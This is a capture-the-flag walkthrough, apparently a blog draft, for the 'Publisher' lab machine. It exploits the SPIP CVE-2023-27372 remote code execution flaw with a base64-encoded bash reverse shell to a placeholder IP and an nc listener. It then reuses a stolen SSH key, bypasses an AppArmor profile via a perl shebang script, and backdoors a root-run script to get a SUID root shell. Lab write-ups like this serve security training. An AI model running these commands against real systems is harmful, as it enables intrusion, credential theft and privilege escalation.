+++
title = 'Publisher'
date = 2024-08-19T12:39:11+02:00
draft = true
+++
![Publisher](/images/publisher/publisher.png)
Grey box beginner friendly machine.

First things first add the ip address to the /etc/hosts file

```
$ echo "<Your $IP> publisher.thm" | sudo tee -a /etc/hosts

```

## Reconnaissance

```
$ rustscan -a $IP -u 5000 -- -A -oN rust.scan
```
```
# Nmap 7.94 scan initiated Mon Aug 19 12:50:24 2024 as: /nix/store/8j0i0cpa2y6i4gz6p35skpxcirqsi31h-nmap-7.94/bin/nmap -vvv -p 22,80 -A -oN rust.scan 10.10.48.222
Nmap scan report for publisher.thm (10.10.48.222)
Host is up, received conn-refused (0.021s latency).
Scanned at 2024-08-19 12:50:25 CEST for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /nix/store/8j0i0cpa2y6i4gz6p35skpxcirqsi31h-nmap-7.94/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 19 12:50:32 2024 -- 1 IP address (1 host up) scanned in 7.40 seconds
```
Once the scan completes we see two open ports:

- port 22/SSH
- port 80/HTTP

We will focus on port 80 which seems to be running an Apache web server hosting an instance of Spip CMS.

## Discovery

```
$ ffuf -u http://publisher.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -c
```
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://publisher.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 25ms]
#                       [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 25ms]
#                       [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 27ms]
# directory-list-2.3-small.txt [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 27ms]
#                       [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 28ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 29ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 28ms]
#                       [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 29ms]
# on at least 3 different hosts [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 30ms]
# Copyright 2007 James Fisher [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 30ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 31ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 32ms]
                        [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 31ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 32ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 36ms]
spip                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 23ms]
                        [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 23ms]
:: Progress: [87664/87664] :: Job [1/1] :: 1652 req/sec :: Duration: [0:00:51] :: Errors: 0 ::
```
After fuzzing we found an interesting directory. Let's take a look.

![spip-dir](/images/publisher/spip.png)

After poking around we found the login page. We could test some passwords but there is no need.

![spip-login](/images/publisher/spip-login.png)

Looking at page source we found the Spip version.

![spip-source](/images/publisher/spip-source.png)


An internet search later we found that Spip 4.2.0 is vulnerable to a RCE (Remote Code Execution) and came across the [Proof of Concept](https://github.com/nuts7/CVE-2023-27372).

## Foothold

First we encode the payload to base64.

```
$ echo "bash -c 'sh -i >& /dev/tcp/Your <IP>/1234 0>&1'" |base64 -w0

YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvWW91ciA8SVA+LzEyMzQgMD4mMScK
```
Then we setup a listener.

```
$ rlwrap -cAr nc -lnvp 1234
```
And lastly we execute the program.

```
$ python3 CVE-2023-27372.py -u http://publisher.thm/spip/ -c "echo YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvWW91ciA8SVA+LzEyMzQgMD4mMScK |base64 -d|bash"
```

Great we got a reverse shell !

![revshell](/images/publisher/revshell.png)

## Enumerating 

After some quick enumeration we found a private ssh key belonging to th user think.
```
$ www-data@41c976e507f8:/home/think/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK
uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+9/2ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc
                         --Redacted--
v0M04fPPBE22VsJGK1Wbi786Z0QVhnbNe6JnlLigk50DEc1WrKvHvWND0WuthNYTThiwFr
LsHpJjf7fAUXSGQfCc0Z06gFMtmhwZUuYEH9JjZbG2oLnn47BdOnumAOE/mRxDelSOv5J5
M8X1rGlGEnXqGuw917aaHPPBnSfquimQkXZ55yyI9uhtc6BrRanGRlEYPOCR18Ppcr5d96
Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==
-----END OPENSSH PRIVATE KEY-----

```
 Let's copy it and change it's permissions. After that we can login as think and view the flag.

![think](/images/publisher/think.png)

```
$ cat /home/think/user.txt
--
Output
```
## Privilege escalation

After some enumeration we found an unknow SUID binary.

```
$ find / -perm -4000 2>/dev/null
```
```
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/sbin/run_container   <---- The one
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/bash
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

Executing it allows us to perform some Docker commands.

![runcontainer](/images/publisher/runcontainer.png)

Looking at the strings on the binary we can assume that it calls a script named "/opt/run_container.sh"

![binbash](/images/publisher/binbash.png)

Even though we have write permissions we can not write to it.

![echo](/images/publisher/echo.png)

Apparmor is enabled and it does not let us do what we want. We need to look at the profiles but first we need to know our shell.

```
$ grep think /etc/passwd 
```
```
think:x:1000:1000:,,,:/home/think:/usr/sbin/ash
```
Next look at the [profiles](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#creating-a-profile) located at /etc/apparmor.d/*.

```
$ cat /etc/apparmor.d/usr.sbin.ash
```
```
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```
To bypass Apparmor we can use this [resource](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass). But we can't write in /tmp so we have to do it in /dev/shm.

```
$ cd /dev/shm
$ echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > test.pl
$ chmod +x test.pl
$ ./test.pl
$
```
Now we can modify /opt/run_container.sh

```
echo "chmod u=s /bin/bash" >> /opt/run_container.sh
```
Execute the Binary and call bash
```
$ run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Exited (128) About a minute ago

Enter the ID of the container or leave blank to create a new one: 41c976e507f8
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container
2) Stop Container
3) Restart Container
4) Create Container
5) Quit
Choose an action for a container: 3
41c976e507f8
$ /bin/bash -p
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) groups=1000(think)
bash-5.0# cat /root/root.txt
--
Output
```
Congratulations !! You've done it!
Thank you for reading!
